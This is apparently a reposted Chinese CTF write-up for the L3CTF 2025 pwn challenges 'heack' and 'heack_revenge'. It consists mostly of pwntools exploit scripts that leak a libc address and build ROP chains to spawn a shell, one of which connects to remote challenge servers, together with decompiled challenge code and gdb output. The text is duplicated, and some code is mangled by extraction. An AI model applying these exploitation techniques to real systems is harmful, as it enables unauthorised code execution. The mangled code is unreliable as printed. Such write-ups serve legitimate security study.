# Pwn题解析｜L3CTF 2025 heack & heack_revenge

> 原文: https://www.ctfiot.com/261704.html
> ID: 261704

HOT

一、heack

[*] '/home/zer00ne/Desktop/New Folder/pwn'
Arch:
amd64-64-little
RELRO:
Full RELRO
Stack:
Canary found
NX:NX enabled
PIE:
PIE enabled
SHSTK:
Enabled
IBT:
Enabled
Stripped:No

from pwn import *
#io=process('./pwn')
libc=ELF('./libc.so.6')
context.log_level='debug'
defbug():
    gdb.attach(io)
defch2(Id):
    io.sendlineafter(b"Choose an option: ",str(Id).encode())
defadd(Id,size,payload):
    ch2(1)
    io.sendlineafter(b"Enter index (0-15): ",str(Id).encode())
    io.sendlineafter(b"Enter diary content size (1-2048): ",str(size).encode())
    io.sendafter(b"Input your content: ",payload)
deffree(Id):
    ch2(2)
    io.sendlineafter(b"Enter index to destroy (0-15): ",str(Id).encode())
defshow(Id):
    ch2(3)
    io.sendlineafter(b"Enter index to view (0-15): ",str(Id).encode())
defover(payload):
    io.sendlineafter(b"> ",b"1")
    io.sendafter(b"You grip your sword and shout:",payload)
defpwn():
    over(b'a'*0x103+p8(0x17))
    io.send(p16(0x591A))
    bug()
    io.sendline()
    io.recvuntil(b"[Attack]: ")
    t=io.recvline()
    base=int(t[:-1],10)-0x204643
print(f"libc_base==>{hex(base)}")
    system=base+libc.sym.system
    rdi=base+0x000000000010f75b
    bin_sh=base+next(libc.search(b"/bin/shx00"))
    payload=b'a'*0x103+p8(0x17)+p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)
    over(payload)
    io.sendline()
whileTrue:
    io=remote("1.95.34.119",9999)
try:
        pwn()
break
except:
        io.close()

io.interactive()

HOT

二、heack_revenge

pwndbg> x/5i 0x555555554000+0x1867+3
0x55555555586a <game+65>:	pop    rbp
0x55555555586b <game+66>:	nop    DWORD PTR [rax]
0x55555555586e <game+69>:	mov    edx,DWORD PTR [rbp-0x18]
0x555555555871 <game+72>:	mov    eax,DWORD PTR [rbp-0x14]
0x555555555874 <game+75>:	xor    eax,edx

while ( 1 )
{
puts("nDuring your grueling training, you feel compelled to document your thoughts...");
puts("1. Write a new diary entry");
puts("2. Destroy a diary entry");
puts("3. View a diary entry");
puts("4. Exit");
printf("Choose an option: ");
    int_4bytes = read_int_4bytes();
if ( int_4bytes == 4 )
break;
if ( int_4bytes > 4 )
goto LABEL_28;
switch ( int_4bytes )
    {
case 3:
printf("Enter index to view (0-%d): ", 15LL);
        v4 = read_int_4bytes();
if ( v4 < 0x10 )
        {
if ( *(_QWORD *)(8LL * (int)v4 + a1) )
          {
printf("n--- Diary Entry %d ---n", v4);
puts(*(constchar **)(8LL * (int)v4 + a1));
puts("----------------------");
          }
else
          {
LABEL_21:
puts("No diary exists at this index.");
          }
        }
else
        {
LABEL_23:
puts("Invalid index!");
        }
break;
case 1:
printf("Enter index (0-%d): ", 15LL);
        v2 = read_int_4bytes();
if ( (unsignedint)v2 >= 0x10 )
goto LABEL_23;
if ( *(_QWORD *)(8LL * v2 + a1) )
        {
puts("This slot already contains a diary. Destroy it first.");
        }
else
        {
printf("Enter diary content size (1-2048): ");
          nbytes = read_int_4bytes();
if ( nbytes && nbytes <= 0x800 )
          {
            *(_QWORD *)(8LL * v2 + a1) = malloc(nbytes + 1);
if ( *(_QWORD *)(8LL * v2 + a1) )
            {
              nbytes_4 = malloc_usable_size(*(void **)(8LL * v2 + a1));
memset(*(void **)(8LL * v2 + a1), 0, nbytes_4);
printf("Input your content: ");
              v7 = read(0, *(void **)(8LL * v2 + a1), nbytes);
if ( v7 <= 0 )
              {
puts("Read failed!");
free(*(void **)(8LL * v2 + a1));
return;
              }
              *(_BYTE *)(*(_QWORD *)(8LL * v2 + a1) + v7) = 0;
printf("Diary saved at index %d!n", (unsignedint)v2);
puts("You steel your resolve - these memoirs shall remain sealed until the dragon lies vanquished.");
            }
else
            {
puts("Failed to allocate memory for diary!");
            }
          }
else
          {
puts("Invalid size!");
          }
        }
break;
case 2:
printf("Enter index to destroy (0-%d): ", 15LL);
        v3 = read_int_4bytes();
if ( (unsignedint)v3 >= 0x10 )
goto LABEL_23;
if ( !*(_QWORD *)(8LL * v3 + a1) )
goto LABEL_21;
free(*(void **)(8LL * v3 + a1));
        *(_QWORD *)(8LL * v3 + a1) = 0LL;
printf("Diary at index %d has been destroyed.n", (unsignedint)v3);
break;
default:
LABEL_28:
puts("Invalid choice!");
break;
    }
  }
puts("Exiting diary system. Goodbye, hero!");
}

case 2:
puts("n[Attack Training]");
    ++v4;
    v3 += 16LL;
printf("[Attack]: %lun", v4);
break;
case 3:
puts("n[HP Training]");
    ++v2;
    v3 += 256LL;
printf("[HP]: %lun", v2);
break;
case 4:
puts("n[Status] Displaying hero stats...");
printf("[HP]: %lun", v2);
printf("[Attack]: %lun", v4);
printf("[Combat Power]: %lun", v3);
printf("Hint: To defeat the mighty dragon, ensure your HP and Attack both exceed 93!");
break;

io.sendlineafter(b"> ",b"5")
add(1,0x500,"A"*8)
add(0,0x100,"A"*8)
free(1)
add(2,0x4e0, "")
add(3, 0x100, "A")
ch2(4)
over(b'a'*0x23+p8(0x37)+p8(0x6a))
io.sendline()
#==========================================================================================
io.sendlineafter(b">", b"2")
io.recvuntil(b"[Attack]:")
base=int(io.recvline()[:-1],10)-0x203b31
print(hex(base))

io.sendlineafter(b"> ",b"5")
add(0, 0x10, "X"*0x10)
ch2(4)
for i in range(10):
    io.sendlineafter(">", "2")
rdi=base+0x000000000010f75b
system=base+libc.sym.system
binsh=base+next(libc.search("/bin/shx00"))
ret=base+0x11ba69
rop=p64(ret)*2+p64(rdi)+p64(binsh)+p64(system)
#================================
io.sendlineafter(b"> ",b"5")
free(0)
add(0, 0xc0, b"X"*0x20+rop)
bug()
ch2(4)

from pwn import *
io=process('./pwn')
libc=ELF('./libc.so.6')
#io=remote("1.95.8.146",19999)
context.log_level='debug'
def bug():
    gdb.attach(io)
def ch2(Id):
    io.sendlineafter(b"Choose an option: ",str(Id).encode())
def add(Id,size,payload):
    ch2(1)
    io.sendlineafter(b"Enter index (0-15): ",str(Id).encode())
    io.sendlineafter(b"Enter diary content size (1-2048): ",str(size).encode())
    io.sendafter(b"Input your content: ",payload)
def free(Id):
    ch2(2)
    io.sendlineafter(b"Enter index to destroy (0-15): ",str(Id).encode())
def show(Id):
    ch2(3)
    io.sendlineafter(b"Enter index to view (0-15): ",str(Id).encode())
def over(payload):
    io.sendlineafter(b"> ",b"1")
    io.sendafter(b"You grip your sword and shout:",payload)

io.sendlineafter(b"> ",b"5")
add(1,0x500,"A"*8)
add(0,0x100,"A"*8)
free(1)
add(2,0x4e0, "")
add(3, 0x100, "A")
ch2(4)
over(b'a'*0x23+p8(0x37)+p8(0x6a))
io.sendline()
#==========================================================================================
io.sendlineafter(b">", b"2")
io.recvuntil(b"[Attack]:")
base=int(io.recvline()[:-1],10)-0x203b31
print(hex(base))
#=========================================================================================
io.sendlineafter(b"> ",b"5")
add(0, 0x10, "X"*0x10)
ch2(4)
for i in range(10):
    io.sendlineafter(">", "2")
rdi=base+0x000000000010f75b
system=base+libc.sym.system
binsh=base+next(libc.search("/bin/shx00"))
ret=base+0x11ba69
rop=p64(ret)*2+p64(rdi)+p64(binsh)+p64(system)
#================================
io.sendlineafter(b"> ",b"5")
free(0)
add(0, 0xc0, b"X"*0x20+rop)
bug()
ch2(4)
#==============================
io.sendlineafter(b"> ",b"445")
io.interactive()

看雪ID：zer00ne

https://bbs.kanxue.com/user-home-1024538.htm

*本文为看雪论坛优秀文章，由 zer00ne 原创，转载请注明来自看雪社区

看雪·2025 KCTF 将于8月15日正式开赛！欢迎来战

# 往期推荐

企业微信 – 白日梦之获取登录二维码

《深入理解计算机系统》Attack Lab 题解

CVE-2024-0582 内核提权详细分析

App之算法分析

关于Office 2000的50次限制的研究

球分享

球点赞

球在看

点击阅读原文查看更多


```
[*] '/home/zer00ne/Desktop/New Folder/pwn'
Arch:
amd64-64-little
RELRO:
Full RELRO
Stack:
Canary found
NX:NX enabled
PIE:
PIE enabled
SHSTK:
Enabled
IBT:
Enabled
Stripped:No
from pwn import *
    #io=process('./pwn')
libc=ELF('./libc.so.6')
context.log_level='debug'
defbug():
    gdb.attach(io)
defch2(Id):
    io.sendlineafter(b"Choose an option: ",str(Id).encode())
defadd(Id,size,payload):
    ch2(1)
    io.sendlineafter(b"Enter index (0-15): ",str(Id).encode())
    io.sendlineafter(b"Enter diary content size (1-2048): ",str(size).encode())
    io.sendafter(b"Input your content: ",payload)
deffree(Id):
    ch2(2)
    io.sendlineafter(b"Enter index to destroy (0-15): ",str(Id).encode())
defshow(Id):
    ch2(3)
    io.sendlineafter(b"Enter index to view (0-15): ",str(Id).encode())
defover(payload):
    io.sendlineafter(b"> ",b"1")
    io.sendafter(b"You grip your sword and shout:",payload)
defpwn():
    over(b'a'*0x103+p8(0x17))
    io.send(p16(0x591A))
    bug()
    io.sendline()
    io.recvuntil(b"[Attack]: ")
    t=io.recvline()
    base=int(t[:-1],10)-0x204643
print(f"libc_base==>{hex(base)}")
    system=base+libc.sym.system
    rdi=base+0x000000000010f75b
    bin_sh=base+next(libc.search(b"/bin/shx00"))
    payload=b'a'*0x103+p8(0x17)+p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)
    over(payload)
    io.sendline()
whileTrue:
    io=remote("1.95.34.119",9999)
try:
        pwn()
break
except:
        io.close()

io.interactive()
pwndbg> x/5i 0x555555554000+0x1867+3
0x55555555586a <game+65>:	pop    rbp
0x55555555586b <game+66>:	nop    DWORD PTR [rax]
0x55555555586e <game+69>:	mov    edx,DWORD PTR [rbp-0x18]
0x555555555871 <game+72>:	mov    eax,DWORD PTR [rbp-0x14]
0x555555555874 <game+75>:	xor    eax,edx
while ( 1 )
{
puts("nDuring your grueling training, you feel compelled to document your thoughts...");
puts("1. Write a new diary entry");
puts("2. Destroy a diary entry");
puts("3. View a diary entry");
puts("4. Exit");
printf("Choose an option: ");
    int_4bytes = read_int_4bytes();
if ( int_4bytes == 4 )
break;
if ( int_4bytes > 4 )
goto LABEL_28;
switch ( int_4bytes )
    {
case 3:
printf("Enter index to view (0-%d): ", 15LL);
        v4 = read_int_4bytes();
if ( v4 < 0x10 )
        {
if ( *(_QWORD *)(8LL * (int)v4 + a1) )
          {
printf("n--- Diary Entry %d ---n", v4);
puts(*(constchar **)(8LL * (int)v4 + a1));
puts("----------------------");
          }
else
          {
LABEL_21:
puts("No diary exists at this index.");
          }
        }
else
        {
LABEL_23:
puts("Invalid index!");
        }
break;
case 1:
printf("Enter index (0-%d): ", 15LL);
        v2 = read_int_4bytes();
if ( (unsignedint)v2 >= 0x10 )
goto LABEL_23;
if ( *(_QWORD *)(8LL * v2 + a1) )
        {
puts("This slot already contains a diary. Destroy it first.");
        }
else
        {
printf("Enter diary content size (1-2048): ");
          nbytes = read_int_4bytes();
if ( nbytes && nbytes <= 0x800 )
          {
            *(_QWORD *)(8LL * v2 + a1) = malloc(nbytes + 1);
if ( *(_QWORD *)(8LL * v2 + a1) )
            {
              nbytes_4 = malloc_usable_size(*(void **)(8LL * v2 + a1));
memset(*(void **)(8LL * v2 + a1), 0, nbytes_4);
printf("Input your content: ");
              v7 = read(0, *(void **)(8LL * v2 + a1), nbytes);
if ( v7 <= 0 )
              {
puts("Read failed!");
free(*(void **)(8LL * v2 + a1));
return;
              }
              *(_BYTE *)(*(_QWORD *)(8LL * v2 + a1) + v7) = 0;
printf("Diary saved at index %d!n", (unsignedint)v2);
puts("You steel your resolve - these memoirs shall remain sealed until the dragon lies vanquished.");
            }
else
            {
puts("Failed to allocate memory for diary!");
            }
          }
else
          {
puts("Invalid size!");
          }
        }
break;
case 2:
printf("Enter index to destroy (0-%d): ", 15LL);
        v3 = read_int_4bytes();
if ( (unsignedint)v3 >= 0x10 )
goto LABEL_23;
if ( !*(_QWORD *)(8LL * v3 + a1) )
goto LABEL_21;
free(*(void **)(8LL * v3 + a1));
        *(_QWORD *)(8LL * v3 + a1) = 0LL;
printf("Diary at index %d has been destroyed.n", (unsignedint)v3);
break;
default:
LABEL_28:
puts("Invalid choice!");
break;
    }
  }
puts("Exiting diary system. Goodbye, hero!");
}
case 2:
puts("n[Attack Training]");
    ++v4;
    v3 += 16LL;
printf("[Attack]: %lun", v4);
break;
case 3:
puts("n[HP Training]");
    ++v2;
    v3 += 256LL;
printf("[HP]: %lun", v2);
break;
case 4:
puts("n[Status] Displaying hero stats...");
printf("[HP]: %lun", v2);
printf("[Attack]: %lun", v4);
printf("[Combat Power]: %lun", v3);
printf("Hint: To defeat the mighty dragon, ensure your HP and Attack both exceed 93!");
break;
io.sendlineafter(b"> ",b"5")
add(1,0x500,"A"*8)
add(0,0x100,"A"*8)
free(1)
add(2,0x4e0, "")
add(3, 0x100, "A")
ch2(4)
over(b'a'*0x23+p8(0x37)+p8(0x6a))
io.sendline()
#==========================================================================================
io.sendlineafter(b">", b"2")
io.recvuntil(b"[Attack]:")
base=int(io.recvline()[:-1],10)-0x203b31
print(hex(base))
io.sendlineafter(b"> ",b"5")
add(0, 0x10, "X"*0x10)
ch2(4)
for i in range(10):
    io.sendlineafter(">", "2")
rdi=base+0x000000000010f75b
system=base+libc.sym.system
binsh=base+next(libc.search("/bin/shx00"))
ret=base+0x11ba69
rop=p64(ret)*2+p64(rdi)+p64(binsh)+p64(system)
#================================
io.sendlineafter(b"> ",b"5")
free(0)
add(0, 0xc0, b"X"*0x20+rop)
bug()
ch2(4)
from pwn import *
io=process('./pwn')
libc=ELF('./libc.so.6')
    #io=remote("1.95.8.146",19999)
context.log_level='debug'
def bug():
    gdb.attach(io)
def ch2(Id):
    io.sendlineafter(b"Choose an option: ",str(Id).encode())
def add(Id,size,payload):
    ch2(1)
    io.sendlineafter(b"Enter index (0-15): ",str(Id).encode())
    io.sendlineafter(b"Enter diary content size (1-2048): ",str(size).encode())
    io.sendafter(b"Input your content: ",payload)
def free(Id):
    ch2(2)
    io.sendlineafter(b"Enter index to destroy (0-15): ",str(Id).encode())
def show(Id):
    ch2(3)
    io.sendlineafter(b"Enter index to view (0-15): ",str(Id).encode())
def over(payload):
    io.sendlineafter(b"> ",b"1")
    io.sendafter(b"You grip your sword and shout:",payload)

io.sendlineafter(b"> ",b"5")
add(1,0x500,"A"*8)
add(0,0x100,"A"*8)
free(1)
add(2,0x4e0, "")
add(3, 0x100, "A")
ch2(4)
over(b'a'*0x23+p8(0x37)+p8(0x6a))
io.sendline()
#==========================================================================================
io.sendlineafter(b">", b"2")
io.recvuntil(b"[Attack]:")
base=int(io.recvline()[:-1],10)-0x203b31
print(hex(base))
#=========================================================================================
io.sendlineafter(b"> ",b"5")
add(0, 0x10, "X"*0x10)
ch2(4)
for i in range(10):
    io.sendlineafter(">", "2")
rdi=base+0x000000000010f75b
system=base+libc.sym.system
binsh=base+next(libc.search("/bin/shx00"))
ret=base+0x11ba69
rop=p64(ret)*2+p64(rdi)+p64(binsh)+p64(system)
#================================
io.sendlineafter(b"> ",b"5")
free(0)
add(0, 0xc0, b"X"*0x20+rop)
bug()
ch2(4)
#==============================
io.sendlineafter(b"> ",b"445")
io.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752579401-wxsync-2025-07-3a96175ee791f3e5432b044bbc225077.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752579403-wxsync-2025-07-e79e92e5ac9690345f357699f4cb94a7.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752579406-wxsync-2025-07-15cbf05c982fedb8793585054c18adbc.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752579408-wxsync-2025-07-a1807b0918dc71581ddae688b6580b62.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752579411-wxsync-2025-07-1e49278e4dd175a3173ba98da2b40882.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752579413-wxsync-2025-07-11532bddc797c43b9489ab5f59038b2f.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752579415-wxsync-2025-07-1280353a34e5794a23b5c3358375b885.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752579417-wxsync-2025-07-14cff7c18faf95c501fd206ca7e1a4ef.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752579419-wxsync-2025-07-fbb1e324a4b593098e990545f82c83a5.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752579421-wxsync-2025-07-113dd7788549226f1ad068711cd7a395.jpg)